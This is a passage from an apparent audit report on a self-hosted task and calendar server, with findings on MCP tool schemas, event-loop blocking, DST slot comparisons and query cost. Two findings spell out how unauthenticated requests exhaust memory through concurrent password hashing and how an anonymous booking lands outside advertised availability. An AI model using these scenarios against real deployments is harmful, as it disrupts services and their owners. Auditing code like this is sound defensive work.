is None, t["due"] or "", t["priority"] or 10, t["summary"] or ""))`. Either include
priority in the key or drop it from the tool description. Add a test with two lists
whose interleaved due dates prove the first page is globally soonest-first.

#### [x] Collection-name schemas omit the control-character guard the HTTP model carries, so a stray \x0b answers "the calendar server may be unreachable"

`backend/tasksd/mcp/tools.py:174` · **low** · bug · `minor`

`smylte_create_list`, `smylte_update_list`, `smylte_create_calendar` and
`smylte_update_calendar` declare `name` as
`{"type":"string","minLength":1,"maxLength":200}`. The HTTP model for the same field is
deliberately stricter: `CollectionName = Annotated[str, Field(min_length=1,
max_length=200, pattern=r"^[^\x00-\x08\x0b\x0c\x0e-\x1f]*$")]` (app.py:71-74), with a
comment explaining that a control character reaches lxml and "escaped every handler and
came back as a 500". `dav/xml.py:_text` is the backstop and raises `DavError("value
contains characters that cannot be represented in XML")`, whose own docstring says
"Callers should reject this at the edge (the API models do, as a 422)" — the MCP tool
schemas are the one caller that does not. validate.py's module docstring states its
purpose is exactly to restore "an equivalent check" for bounds pydantic already enforced
behind FastAPI, so this is a gap in the thing that was added to close gaps. The user-
visible cost is a wrong diagnosis: `DavError` lands in `McpServer._call`'s blanket
handler and comes back as "could not be completed (DavError). The calendar server may be
unreachable; try again shortly", so the model retries an input error indefinitely
instead of stripping the character.

<details><summary>Evidence</summary>

```
tools.py:173-177 / 187-189 / 352-353 / 364-366
    "name": {"type": "string", "minLength": 1, "maxLength": 200},      # no pattern

app.py:71-74 (the same field over HTTP)
    CollectionName = Annotated[str, Field(min_length=1, max_length=200,
        pattern=r"^[^\x00-\x08\x0b\x0c\x0e-\x1f]*$")]

dav/xml.py:118-129
    _XML_FORBIDDEN = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
    def _text(el, value):
        if _XML_FORBIDDEN.search(value):
            raise DavError("value contains characters that cannot be represented in XML")

Failure scenario:
  tools/call smylte_create_list {"name": "Reading list"}
  -> check_arguments passes (type/minLength/maxLength all satisfied)
  -> service._create_collection -> dav.create_task_collection -> X.build_mkcalendar -> _text -> DavError
  -> server.py:178 -> {"isError": true, "text": "smylte_create_list could not be completed (DavError). The calendar server may be unreachable; try again shortly."}
Over HTTP the same name is a 422 naming the pattern.
```

</details>

**Suggested fix.** Add the same `"pattern": "^[^\\x00-\\x08\\x0b\\x0c\\x0e-\\x1f]*$"` to the four
collection-name schemas (validate.py already enforces `pattern`), so the model gets
"name is not in the expected format" and can fix it. Add a test asserting a control
character in `name` is rejected by the validator rather than by the DAV client.

#### [x] smylte_find_free_time raises an unhandled OverflowError on a range that ends on the last representable day

`backend/tasksd/mcp/api.py:481` · **low** · bug · `minor`

`find_free_time` walks days with `day += timedelta(days=1)` inside `while
datetime.combine(day, time_of_day.min) < ed`. When the window's end has a time component
on 9999-12-31, the loop body runs for that final day and then increments past
`date.max`, raising `OverflowError: date value out of range`. `_range` (api.py:284-297)
does not defend against it — its only bounds are `ed > sd` and `(ed - sd).days >
MAX_RANGE_DAYS`, both of which a 2-day window at the end of the calendar satisfies.
`OverflowError` is neither `ToolError` nor `ValueError`, so it reaches the blanket
handler and is reported as "the calendar server may be unreachable" — after the call has
already swept every calendar in the window under the global service lock.

<details><summary>Evidence</summary>

```
api.py:480-495
    day = sd.date()
    while datetime.combine(day, time_of_day.min) < ed:
        ...
        day += timedelta(days=1)

Verified by executing the loop's arithmetic in isolation:
    sd = datetime(9999,12,30,0,0); ed = datetime(9999,12,31,23,59)
    (ed-sd).days == 1                      # passes the MAX_RANGE_DAYS guard
    -> OverflowError: date value out of range   (after 2 iterations)

Failure scenario:
  tools/call smylte_find_free_time {"start":"9999-12-30","end":"9999-12-31T23:59"}
  -> _range accepts (1 day)
  -> list_events sweeps every calendar under the lock
  -> OverflowError -> server.py:178
  -> {"isError": true, "text": "smylte_find_free_time could not be completed (OverflowError). The calendar server may be unreachable; try again shortly."}
The same class reaches _as_dt via `value.astimezone()` for an offset-aware bound at datetime.max.
```

</details>

**Suggested fix.** Guard the increment — `if day == date.max: break` before `day += timedelta(days=1)` — or
bound the accepted window in `_range` to a sane calendar span (e.g. reject years past
9000) so the caller gets a ToolError sentence instead of a mislabelled backend failure.

#### [x] No MCP-level test exercises any event write tool or any recurrence scope

`backend/tests/test_mcp.py:208` · **low** · test-gap

`test_tools_round_trip_real_data` is the only end-to-end tool test and it covers exactly
six tools: create_list, create_task, list_tasks, search_tasks, complete_task,
delete_list. Nothing in the file calls smylte_create_event, smylte_update_event,
smylte_move_event, smylte_delete_event, smylte_update_task, smylte_cancel_task,
smylte_get_event, smylte_update_booking_link (beyond its schema rejections), or
smylte_update_list/update_calendar. Those are the handlers with the real branching —
`_SCOPE` ('this' / 'thisandfuture' / 'all') routes to four different engine methods
(`override_event`, `split_event`, `shift_event`, `edit_event`, service.py:521-531), each
of which rewrites CalDAV resources in place, and `_rrule` builds an RRULE from three
interacting arguments. Every one of them is reachable by a hostile client with a write
token and none has a test. Concretely: the three findings above (KeyError on unknown
uid, `{"deleted": uid}` for a nonexistent uid, and calendar/list id confusion) would all
have been caught by a single test that drives a delete or an update against an id that
does not exist, and none exists. `test_free_time_reads_a_duration_only_event`
monkeypatches `list_events` away, so even find_free_time never sees a real event through
the tool path.

<details><summary>Evidence</summary>

```
test_mcp.py:208-235 — the only tool round-trip:
    smylte_create_list -> smylte_create_task -> smylte_list_tasks ->
    smylte_search_tasks -> smylte_complete_task -> smylte_list_tasks -> smylte_delete_list

grep over the whole file for the untested tools returns nothing:
    smylte_create_event, smylte_update_event, smylte_delete_event,
    smylte_move_event, smylte_get_event, smylte_update_task,
    smylte_cancel_task, smylte_update_list, smylte_update_calendar

The closest existing coverage, test_tool_arguments_are_checked_against_the_advertised_schema (test_mcp.py:667), only asserts that bad *arguments* are rejected before the handler runs — every assertion there fails validation, so no handler body past check_arguments is ever entered for a write tool other than create_list/create_task.
```

</details>

**Suggested fix.** Add a round-trip alongside the task one: create a calendar, create a repeating event,
list it and read a `recurrence_id` back, update one occurrence with scope='this', delete
one with scope='this', move the series to a second calendar, then delete the calendar —
asserting the DTOs at each step. Add negative cases for a nonexistent uid on each
write/delete tool and for a task-list id passed to a calendar tool; those pin findings
1, 2 and 4.

### HTTP API surface

#### [x] _href() resolves the list id on the event loop while holding the global service lock, so any slow Radicale write or sync freezes the entire process (including /healthz and /api/login)

`backend/tasksd/app.py:813` · **high** · bug

Every service call in app.py is dispatched to a worker thread through `_run` (`await
asyncio.to_thread(...)`, app.py:818-819) — with exactly two exceptions: `_href()`
(app.py:812-816) and the identical call inside `reorder_tasks` (app.py:943). Both call
`TaskService.resolve_list()` synchronously from inside an `async def` handler, so they
run on the event-loop thread.
`resolve_list` (service.py:168-174) acquires `TaskService._lock` — the single global
`threading.RLock` (service.py:74) that serializes ALL SQLite and ALL CalDAV access. That
lock is held across network I/O to Radicale: `_create_collection` holds it across
`self._dav.create_task_collection` (service.py:303-305), `update_collection` across
`self._dav.proppatch` (service.py:329-332), `reorder_collections` across one PROPPATCH
per collection (service.py:340-345), `delete_collection` across
`self._dav.delete_collection` (service.py:350-352),
`create_task`/`edit_task`/`delete_task` across the engine's GET+PUT
(service.py:358-388), and `sync_all` across each `self._engine.sync(href)` REPORT
(service.py:117-130). The DAV client timeout is 30 s (config.py:113,
`TASKS_HTTP_TIMEOUT` default "30").
Because `_href` blocks in `RLock.acquire()` on the event-loop thread, the loop stops
entirely for the duration — not just the one request. Routes that never touch the
service (`/healthz`, `/api/login`, `/api/me`, the static SPA mount), the SSE keepalive
writes on `/api/events`, and the accept loop all stall. This is materially worse than
the threadpool contention docs/AUDIT.md already records (line 1130 attributes the stall
to `asyncio.to_thread(...) -> with self._lock`, i.e. worker threads, which would leave
the loop alive); the loop-blocking path via `_href` is not identified anywhere in
AUDIT.md.
Adversary #4 in the trust model is "an unreliable Radicale (slow, 5xx, ...)" — this
converts a Radicale outage into a total outage of the app, including every read path
that would otherwise be served purely from the SQLite cache, and including the health
endpoint an operator uses to tell the two apart.

<details><summary>Evidence</summary>

```
app.py:812-819 — the only two non-threaded service calls in the file:

    def _href(request: Request, list_id: str) -> str:
        href = _svc(request).resolve_list(list_id)   # <- sync call, on the event loop
        if href is None:
            raise HTTPException(status.HTTP_404_NOT_FOUND, f"unknown list {list_id}")
        return href

    async def _run(fn, *a, **kw):
        return await asyncio.to_thread(fn, *a, **kw)

service.py:168-174:

    def resolve_list(self, list_id: str) -> str | None:
        with self._lock:                              # <- the global RLock
            for row in store.get_collections(self._conn):
                ...

`_href` is called as the FIRST statement, before any `await`, in 20 routes: app.py:852, 865, 878 (per element of an unbounded `ReorderLists.ids`), 885, 890, 901, 909, 918, 923, 928, 962, 979, 990, 1002, 1010, 1027-1028, 1040, 1061, 1072.

Concrete failure: Radicale is wedged (TCP accepts, never answers). The 30 s background loop fires `svc.sync_all` (app.py:620) in a worker thread; it takes `self._lock` and blocks inside `engine.sync(href)` for the full 30 s httpx timeout, per collection. During that window the owner's browser issues `GET /api/lists/inbox/tasks` -> `_href` -> `resolve_list` -> `RLock.acquire()` on the loop thread. From that instant:
  * `GET /healthz` (app.py:1305, touches nothing) returns nothing — the monitor marks the app dead;
  * `POST /api/login` (app.py:1154) returns nothing;
  * the SSE `: keepalive` write (app.py:1136) never fires, so every open browser stream times out and reconnects;
  * `GET /` and every static asset hangs.
With N event/task collections the sweep is N x 30 s and repeats every 30 s, so the process is effectively unresponsive for as long as Radicale is down. The same freeze happens (for ~21 s) on the measured full-resync path already recorded in docs/AUDIT.md:1130, and for the ordinary sub-second duration of every single task/event write.

No test covers this: the whole HTTP suite drives the app through `TestClient`, which issues one request at a time, so lock contention between a request and the sync loop never occurs.
```

</details>

**Suggested fix.** Make `_href` async and thread it like every other service call: `async def
_href(request, list_id): href = await _run(_svc(request).resolve_list, list_id); ...`,
and `await _href(...)` at the 20 call sites; likewise `resolved = await
_run(svc.resolve_list, item.list)` at app.py:943. While there, give `ReorderLists.ids`
the `max_length` bound its sibling `ReorderTasks.items` already carries (app.py:89 vs
117) — `reorder_lists` does one resolve *and* one PROPPATCH under the lock per element.
Add a test that holds `TaskService._lock` from a background thread and asserts `GET
/healthz` still answers within a second.

### Auth + session

#### [x] POST /oauth/authorize runs the same scrypt hash as /api/login without the `login_hashes` semaphore that exists to stop exactly that

`backend/tasksd/mcp/routes.py:259` · **low** · security · `minor`

`/api/login` deliberately caps concurrent password hashes at 4 because scrypt here costs
~16 MiB a call and the thread pool is shared with every other endpoint. The MCP consent
POST verifies the *same* password through the *same* `Authenticator.check_credentials`
on the *same* `asyncio.to_thread` executor, is equally unauthenticated (the password is
the auth), and accepts a password up to 64 000 bytes — with no such cap. Its rate
limiter reserves 8 attempts per key before the await, so K source addresses put up to 8K
hashes in flight, bounded only by the default executor's `min(32, cpu+4)` threads. Every
`_run` in the app — all SQLite reads, all CalDAV calls — queues behind those threads.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:1152-1175, the guard and why it exists:

    login_hashes = asyncio.Semaphore(4)
    ...
        # scrypt is memory-hard by design (~16 MiB a call), so unbounded
        # concurrency is an unauthenticated memory amplifier — and every other
        # endpoint shares this thread pool.
        async with login_hashes:
            ok = await asyncio.to_thread(
                authenticator.check_credentials, body.username, body.password
            )

backend/tasksd/mcp/routes.py:259, the same call with no guard (`run` is `_run`, i.e. `asyncio.to_thread`, wired at app.py:1389):

    ok = await run(oauth.check_password, form.get("username", ""), form.get("password", ""))

oauth.check_password -> routes.py:138-145 verify_password -> authenticator.check_credentials -> hashlib.scrypt(n=2**14, r=8, p=1) (auth.py:31, 49-55).

Concrete: with TASKS_MCP_ENABLED on (the trust model's adversary #2 reaches every OAuth endpoint anonymously), 4 source addresses each fire 8 concurrent `POST /oauth/authorize` with `action=approve` and a 64 KB `password=` field. `_throttle` (routes.py:164-171) reserves 8 per key before the await, so all 32 pass the gate and land in the default executor at once: 32 x ~16 MiB resident and every executor thread busy for the duration. `/api/login` under identical load holds itself to 4. Meanwhile `body.username`/`body.password` at /api/login carry `max_length` bounds; the form field here is capped only by `_MAX_FORM_BYTES = 64_000`.

No test covers concurrency on this endpoint; `test_concurrent_logins_cannot_outrun_the_lockout` (tests/test_security.py:200-223) pins the property for /api/login only.
```

</details>

**Suggested fix.** Pass the existing `login_hashes` semaphore into `mcp.routes.register(...)` (it is
already constructed per-app in `create_app`) and wrap the consent check: `async with
hash_gate: ok = await run(oauth.check_password, ...)`. Sharing one gate is the right
shape — it is one password and one thread pool. Also bound the submitted password length
before hashing, the way `Login.password` does. Add the concurrency test for
`/oauth/authorize` that `/api/login` already has.

### Service layer + booking

#### [x] DST fall-back: slot filters compare wall clock, not instants — the public page advertises slots in the PAST and hides genuinely free ones

`backend/tasksd/scheduling.py:209` · **high** · bug

The UTC-stepping fix (AUDIT "DST: slot math uses wall-clock timedelta arithmetic",
ticked) made every emitted slot exactly `duration` of absolute time and correctly
restored both passes of the repeated fall-back hour. What it did NOT fix is the
*comparisons*. `slot.start >= open_from` (scheduling.py:209) and every comparison inside
`_overlaps_any` (scheduling.py:221-225) operate on datetimes that all carry the SAME
`ZoneInfo` object (`tz` is constructed once in `public_link_info`/`book_slot` and
threaded through `generate_slots`, `parse_event_time` and `busy_intervals`). CPython's
`datetime_richcompare` short-circuits to a NAIVE field comparison whenever `self.tzinfo
is other.tzinfo`, so on the fall-back day the fold=0 pass (e.g. 01:00 CDT = 06:00Z) and
the fold=1 pass (01:00 CST = 07:00Z) are indistinguishable to every filter in the
generator. Two consequences, both on the only unauthenticated write path: (1) the min-
notice / not-in-the-past filter admits a slot whose instant is already gone and rejects
one that is genuinely in the future; (2) a busy event in either pass of the repeated
hour blocks BOTH passes, silently deleting an hour of real availability that the earlier
fix was written to expose.

<details><summary>Evidence</summary>

```
scheduling.py:207-213 —

```python
            while s_utc + duration <= end_utc:
                slot = Interval(s_utc.astimezone(tz), (s_utc + duration).astimezone(tz))
                if slot.start >= open_from and not _overlaps_any(slot, blocked):
```

The premise, against the pinned interpreter:

    tz = ZoneInfo('America/Chicago');  ZoneInfo('America/Chicago') is tz  -> True
    a = datetime(2026,11,1,1,0,tzinfo=tz,fold=0)   # 06:00Z
    b = datetime(2026,11,1,1,0,tzinfo=tz,fold=1)   # 07:00Z
    a == b  ->  True          # different instants, equal because tzinfo is tzinfo

(1) Past slot advertised and bookable. Link tz America/Chicago, `availability={"6": ["00:00-05:00"]}`, duration 30, min_notice_hours=0, horizon 3, `now = 2026-11-01T07:15:00Z` (= 01:15 CST). Driven through the real `TaskService.public_link_info` (in-memory DB, DAV write stubbed at `create_event`):

    advertised slots:
       2026-11-01T01:30:00-05:00  = 2026-11-01T06:30:00+00:00   <-- 45 MINUTES IN THE PAST
       2026-11-01T01:30:00-06:00  = 2026-11-01T07:30:00+00:00
       2026-11-01T02:00:00-06:00  = 2026-11-01T08:00:00+00:00
       ...
    # 2026-11-01T07:00:00Z (01:00 CST, genuinely free and 45 min in the FUTURE) is never offered:
    # its wall clock 01:00 fails `>= open_from` (wall 01:15).

    svc.book_slot(tok, start_iso="2026-11-01T01:30:00-05:00", ...)  -> 201
    VEVENT written at 2026-11-01 06:30:00+00:00 -> 2026-11-01 07:00:00+00:00

An anonymous visitor puts an event on the owner's calendar 45 minutes in the past, and the confirmation shows `start 2026-11-01T01:30:00-05:00` / `end 2026-11-01T01:00:00-06:00` — an end that renders an hour BEFORE the start ("1:30 AM" to "1:00 AM").

(2) Busy over-blocks. Same link, `now = 2026-10-31T12:00Z`, one busy interval 06:00Z-06:30Z (01:00-01:30 CDT):

    offered: 05:00Z 05:30Z 06:30Z 07:30Z 08:00Z 08:30Z 09:00Z 09:30Z 10:00Z 10:30Z
    07:00Z offered? False        # 01:00 CST is completely free, but its wall clock 01:00
                                 # matches the busy block's wall clock, so _overlaps_any kills it

No test can see either: `_dst_slots` (tests/test_scheduling.py:181-190) hardcodes `busy=[]` and `min_notice_hours=0` with `now` a full day before the transition, so neither `open_from` nor `_overlaps_any` is ever exercised on a DST day.
```

</details>

**Suggested fix.** Compare instants, never wall clock, once the tz-aware values may share a tzinfo. In
`generate_slots`, keep the UTC cursor and filter on it: `if s_utc >=
open_from.astimezone(timezone.utc) and not _overlaps_any(...)`. In `_overlaps_any`,
normalize both sides first (`bs, be = b.start.astimezone(timezone.utc),
b.end.astimezone(timezone.utc)` and likewise for the slot) — or, cheaper, have
`pad()`/`merge()` return UTC-normalized intervals and pass the slot's UTC bounds in. Add
DST cases to `_dst_slots` that pass a real `busy` list and a `now` inside the repeated
hour, asserting (a) every offered slot's instant is >= now + min_notice, and (b) a busy
block covering only 06:00Z-06:30Z leaves 07:00Z offered.

#### [x] book_slot's slot match is wall-clock, so an anonymous POST can book an instant that was never offered (outside the link's availability window)

`backend/tasksd/service.py:790` · **medium** · security · `minor`

`book_slot` re-validates the request with `if not any(s.start == req for s in slots)`.
`req` is `datetime.fromisoformat(start_iso).astimezone(tz)` and every `s.start` is
`s_utc.astimezone(tz)` — the same `ZoneInfo` object on both sides, so `==` degrades to a
naive field comparison (see the sibling finding in scheduling.py). On the DST fall-back
day the two passes of the repeated hour therefore satisfy the check interchangeably: a
request naming the 01:00 CST instant is accepted because the 01:00 CDT slot exists, and
vice versa. The instant that is actually written is `req`'s — `end =
(req.astimezone(timezone.utc) + timedelta(minutes=duration))` and
`dtstart=req.astimezone(timezone.utc)` — so the VEVENT lands at a time the availability
window does not cover and the public page never advertised. This is the single
unauthenticated write path into the owner's calendar, and the guard that is supposed to
bound it is the one being bypassed.

<details><summary>Evidence</summary>

```
service.py:779-798 —

```python
            slots = scheduling.generate_slots(..., only_day=req.date())
            if not any(s.start == req for s in slots):
                raise scheduling.SlotTaken("that time is not available")
            end = (req.astimezone(timezone.utc)
                   + timedelta(minutes=link["duration_minutes"])).astimezone(tz)
```

Driven through the real `TaskService` (in-memory SQLite, one VEVENT collection, `create_event` stubbed to capture the write). Link: tz `America/Chicago`, duration 30, `availability={"6": ["00:00-01:30"]}` — the window closes at 01:30 CDT = 06:30Z. `now = 2026-10-31T12:00:00Z`.

    svc.public_link_info(tok, now=NOW)['slots']:
       2026-11-01T00:00:00-05:00   = 05:00Z
       2026-11-01T00:30:00-05:00   = 05:30Z
       2026-11-01T01:00:00-05:00   = 06:00Z        <- last slot; window ends 06:30Z

    svc.book_slot(tok, start_iso="2026-11-01T01:00:00-06:00", name="N", email="n@x.co", now=NOW)
      -> {'id': 'fbf73195…', 'start': '2026-11-01T01:00:00-06:00', 'end': '2026-11-01T01:30:00-06:00', ...}
    VEVENT written at 2026-11-01 07:00:00+00:00 -> 2026-11-01 07:30:00+00:00

07:00Z is a full hour after the owner's availability window closed and was never in the `slots` array, yet the booking is accepted with a 201. `tests/test_service_unit.py` exercises `book_slot` only on 2026-07-13 (no transition); `tests/test_scheduling.py` never calls it on a DST day at all.
```

</details>

**Suggested fix.** Match on the absolute instant: `req_utc = req.astimezone(timezone.utc)` and `if not
any(s.start.astimezone(timezone.utc) == req_utc for s in slots)`. (The event write
already uses `req.astimezone(timezone.utc)`, so this makes the check agree with the
write.) Add a test that on 2026-11-01 with `availability={"6": ["00:00-01:30"]}` a POST
for `2026-11-01T01:00:00-06:00` raises `SlotTaken`, while `2026-11-01T01:00:00-05:00`
succeeds.

#### [x] generate_slots' default max_slots=1000 silently truncates the public page — the tail of a long horizon renders as fully booked

`backend/tasksd/service.py:715` · **medium** · bug

`public_link_info` calls `generate_slots` without `max_slots`, taking the default of
1000 (scheduling.py:156). The generator returns as soon as it has 1000 slots, with no
exception, no flag, and nothing the caller can distinguish from "the horizon really ends
here". `horizon_days` is bounded at 180 by both the HTTP model
(`CreateBookingLink.horizon_days: Field(ge=1, le=180)`, app.py:243) and the MCP schema,
so a perfectly ordinary link overruns the cap by a factor of two or three and the last
third-to-half of the advertised horizon shows up on /book/{token} as having no free time
at all. The asymmetry makes it invisible from the server's side too: `book_slot` passes
`only_day=req.date()`, so the cap never binds there — those days are still bookable by a
hand-built POST, and every log line looks normal.

<details><summary>Evidence</summary>

```
service.py:715-724 (no `max_slots` argument) and scheduling.py:186-212 (`while day <= last_day and len(slots) < max_slots:` … `if len(slots) >= max_slots: return slots`).

Measured against the real module (`tz=America/Chicago`, `now=2026-07-13T12:00Z`, `min_notice_hours=24`, `buffer=0`, no busy):

    Mon-Fri 09:00-17:00, 30 min, horizon_days=180 -> n=1000, last slot 2026-10-08
        (declared horizon runs to 2027-01-09: the final ~93 days are advertised as empty)
    7 days/wk 09:00-17:00, 30 min, horizon_days=90 -> n=1000, last slot 2026-09-14
        (declared horizon runs to 2026-10-11: the final ~27 days are advertised as empty)
    Mon-Fri 09:00-17:00, 15 min, horizon_days=90  -> n=1000, last slot 2026-08-26
    Mon-Fri 09:00-17:00, 30 min, horizon_days=30  -> n=352   (the default horizon is fine)

Failure scenario: the owner sets horizon_days=180 (the UI's maximum) on a standard 30-minute, Mon-Fri 9-to-5 link. A client opens the link in November to book something in December and every day past 2026-10-08 shows no availability; the owner sees a working page and a plausible slot list and has no way to tell that a third of their calendar is being withheld.

Test gap: `test_max_slots_cap` (tests/test_scheduling.py:241) passes `max_slots=50` explicitly and asserts `len(slots) == 50`. The production default of 1000 is never exercised against a realistic horizon, so raising or lowering it cannot fail the suite.
```

</details>

**Suggested fix.** Size the cap to the configuration instead of a flat constant, or make truncation
visible. Cheapest correct fix: pass `max_slots` from `public_link_info` derived from the
link (e.g. `horizon_days * 24 * 60 // duration_minutes`, itself capped at a hard
ceiling), and when the returned count hits the cap, either include a `truncated: true`
in the payload so the page can say "showing the next N days" or stop the day loop at the
last fully-generated day so the boundary is a whole day rather than mid-morning. Add a
test asserting that a Mon-Fri 09:00-17:00 / 30-minute / 180-day link offers at least one
slot on the final day of its horizon.

#### [x] _list_dto materialises every item row — raw_ics included — from every collection just to compute four counts, under the global service lock

`backend/tasksd/service.py:145` · **low** · bug

`_list_dto` computes `open_count` / `task_count` / `event_count` / `total` by calling
`store.get_items(self._conn, row["href"])`, which is `SELECT * FROM items WHERE
collection_href=? ORDER BY COALESCE(due,'9999'), COALESCE(summary,'')`
(store.py:521-528) — i.e. it pulls every column of every row, including the `raw_ics`
body, into Python `sqlite3.Row` objects, then throws all of it away except four
integers. It also runs a separate `SELECT * FROM list_settings WHERE collection_href=?`
per row (service.py:149-151), an N+1. `_list_dto` is called once per collection by
`list_lists()` and again by `list_calendars()` — both hit on every SPA load and on every
`rev` bump from SSE — and all of it happens inside `with self._lock`, the same lock
`POST /api/login` and the anonymous `GET /api/public/booking/{token}` serialize on.

<details><summary>Evidence</summary>

```
service.py:143-151 —

```python
    def _list_dto(self, row) -> dict[str, Any]:
        comps = [c for c in (row["components"] or "").split(",") if c]
        items = store.get_items(self._conn, row["href"])
        task_items = [i for i in items if i["component"] == "VTODO"]
        open_count = sum(1 for i in task_items if i["status"] not in ("COMPLETED", "CANCELLED"))
        event_count = sum(1 for i in items if i["component"] == "VEVENT")
        settings_row = self._conn.execute(
            "SELECT * FROM list_settings WHERE collection_href=?", (row["href"],)
        ).fetchone()
```

Measured against the real schema, one collection seeded with 4 000 ordinary VEVENTs (in-memory DB, so an on-disk one is strictly slower):

    store.get_items(conn, '/u/cal/')  -> 4000 rows, 0.039 s, 2 166 890 bytes of raw_ics materialised
    SELECT component, status, COUNT(*) FROM items WHERE collection_href=? GROUP BY 1,2  -> 0.003 s

So each `GET /api/lists` + `GET /api/calendars` pair pays ~80 ms and ~4.3 MB of allocation *per such collection*, discarded immediately, while holding the lock. The AUDIT already treats a few-thousand-item collection as ordinary ("one imported holiday/sports subscription, or a few years of events"). The FTS finding at store.py:222 is the same class of problem on the write path; this is the read path, and it fires on every sidebar render rather than only on a resync.
```

</details>

**Suggested fix.** Replace the scan with an aggregate: one `SELECT component, status, COUNT(*) FROM items
WHERE collection_href=? GROUP BY component, status` per collection (or a single grouped
query over all collections, joined in Python), and fold the `list_settings` lookup into
one `SELECT * FROM list_settings` fetched once by `list_lists`/`list_calendars` and
passed down the way `counts`/`names` already are in `_link_dto`. Add a coverage test
that `list_lists()` on a collection of a few thousand items completes in a bounded time.

#### [x] Test gap: the DST slot battery never supplies busy intervals or a `now` inside the transition, and no test drives book_slot across one

`backend/tests/test_scheduling.py:181` · **low** · test-gap

DST slot math has already produced one verified HIGH in this repo, and the guard tests
written for it only cover the *arithmetic* half. `_dst_slots` — the single helper behind
all four DST tests (`test_dst_slots_are_exactly_the_advertised_length`,
`test_dst_slots_name_distinct_instants`, `test_fall_back_offers_the_repeated_hour`,
`test_dst_day_lengths_differ_by_the_transition`) — hardcodes `busy=[]`,
`buffer_minutes=0` and `min_notice_hours=0` with `now` set to a full day *before* the
transition. So the `slot.start >= open_from` filter and the whole of `_overlaps_any` are
never exercised on a DST day, which is exactly where the two comparison bugs above live.
`tests/test_service_unit.py` calls `book_slot` only on 2026-07-13 (no transition), and
`tests/test_scheduling.py` never calls it on a DST day at all, so the booking-side match
`any(s.start == req)` has zero DST coverage on the only unauthenticated write path.

<details><summary>Evidence</summary>

```
tests/test_scheduling.py:181-190 —

```python
def _dst_slots(day: date, duration_minutes: int, window: str = "00:00-05:00"):
    av = scheduling.parse_availability({str(day.weekday()): [window]})
    return scheduling.generate_slots(
        availability=av, duration_minutes=duration_minutes, busy=[], buffer_minutes=0,
        tz=TZ, now=datetime(day.year, day.month, day.day, tzinfo=TZ) - timedelta(days=1),
        min_notice_hours=0, horizon_days=2, only_day=day,
    )
```

`busy=[]` and a `now` one day early mean `blocked` is always empty and `open_from` always precedes every candidate. Concretely: change nothing in `scheduling.py`, and both defects above reproduce while the entire suite stays green —

    busy=[06:00Z-06:30Z] on 2026-11-01 -> the free 07:00Z slot disappears (no test observes it)
    now=2026-11-01T07:15Z              -> 06:30Z (in the past) is offered and 07:00Z is not (no test observes it)
    book_slot(start="2026-11-01T01:00:00-06:00") with availability 00:00-01:30 -> 201 (no test observes it)

`grep -rn book_slot tests/` returns only `tests/test_service_unit.py:98/114/119/127`, all on 2026-07-13.
```

</details>

**Suggested fix.** Give `_dst_slots` optional `busy` / `now` / `min_notice_hours` parameters and add three
cases: (1) fall-back with a busy interval covering only 06:00Z-06:30Z, asserting 07:00Z
is still offered; (2) fall-back with `now = 2026-11-01T07:15:00Z`, asserting every
offered slot's `.astimezone(UTC)` is >= `now` and that 07:00Z IS offered; (3) a
`book_slot`-level test on 2026-11-01 with `availability={"6": ["00:00-01:30"]}`
asserting a POST for `2026-11-01T01:00:00-06:00` raises `SlotTaken` while `…-05:00`
succeeds.

### iCalendar edit path

#### [x] _at_or_after compares aware vs naive datetimes directly, so one floating EXDATE/RDATE/RECURRENCE-ID makes every "this and following" edit or delete a 500

`backend/tasksd/ical/edit.py:534` · **medium** · bug · `minor`

`_at_or_after` is the only date comparator in this file that does not tolerate mixed tz-
awareness. `_same_instant` (509-520) and `_comparable` (343-353) both deliberately drop
to wall clock rather than raise, with comments explaining exactly why (a foreign
client's value may have lost or never carried a zone). `_at_or_after` does `_as_utc(a)
>= _as_utc(anchor)` and `_as_utc` returns a naive datetime unchanged, so comparing a
floating value against a zone-aware one raises TypeError. It is the predicate behind
both split partitioners — `_drop_overrides` (edit.py:846) and `_partition_datelist`
(edit.py:859) — so a single mixed-awareness EXDATE, RDATE, or override RECURRENCE-ID
makes `split_series` raise. `patch_event` catches only ValueError (app.py:1018-1020) and
`delete_event` catches nothing (app.py:1033-1046), so it escapes as a 500, and every
retry reproduces it: that series can never be split or have "this and following" deleted
again. Mixed awareness is ordinary in a shared collection — this app writes floating
DTSTART/EXDATE values while DAVx5/jtx/Thunderbird write TZID-qualified ones onto the
same resource, and vice versa. The existing mixed-zone split tests (test_recur.py:736
`test_split_partitioning_keeps_each_exdate_in_its_own_zone`) use two *aware* zones only,
so nothing in the suite touches the aware/naive pair.

<details><summary>Evidence</summary>

```
edit.py:530-537:

    def _at_or_after(a, anchor) -> bool:
        a, anchor = _period_start(a), _period_start(anchor)
        if isinstance(a, datetime) and isinstance(anchor, datetime):
            return _as_utc(a) >= _as_utc(anchor)      # <- naive >= aware

Probe (pinned icalendar 7.2.2 / dateutil 2.9.0), master zone-aware, one floating EXDATE such as DAVx5 or an older write of ours would leave:

    BEGIN:VEVENT
    DTSTART;TZID=America/Chicago:20260106T090000
    DTEND;TZID=America/Chicago:20260106T093000
    RRULE:FREQ=WEEKLY;COUNT=6
    EXDATE:20260113T090000            <- floating
    END:VEVENT

    split_series(raw, '2026-01-20T09:00:00-06:00', EventEdit())
      File edit.py:906, in split_series -> _partition_datelist(hmaster, "EXDATE", anchor, keep_before=True)
      File edit.py:858, in _partition_datelist -> _rebuild_datelist(...)
      File edit.py:859, in <lambda> -> _at_or_after(v, anchor)
      File edit.py:534, in _at_or_after -> return _as_utc(a) >= _as_utc(anchor)
    TypeError: can't compare offset-naive and offset-aware datetimes

The same TypeError from the other two entry points, both verified:
  - floating master + `EXDATE;TZID=Europe/Berlin:20260113T160000` (our own event, a foreign client excluded one occurrence) -> same trace via _partition_datelist
  - zone-aware master + an override carrying a floating `RECURRENCE-ID:20260113T090000` -> trace via _drop_overrides (edit.py:846)

App-level: PATCH /api/calendars/{cal}/events/{uid} {"scope":"thisandfuture",...} and DELETE .../events/{uid}?scope=thisandfuture&recurrence_id=... both 500 (TypeError is not ValueError, and delete_event has no try at all).
```

</details>

**Suggested fix.** Normalize inside `_at_or_after` the way `_comparable` already does: after
`_period_start`, when both sides are datetimes and `(a.tzinfo is None) != (anchor.tzinfo
is None)`, compare `a.replace(tzinfo=None) >= anchor.replace(tzinfo=None)` (wall clock)
instead of `_as_utc`. Simplest correct form is to reuse the existing helper: `a, anchor
= _comparable(a, anchor); return a >= anchor` for the datetime/datetime case. Add
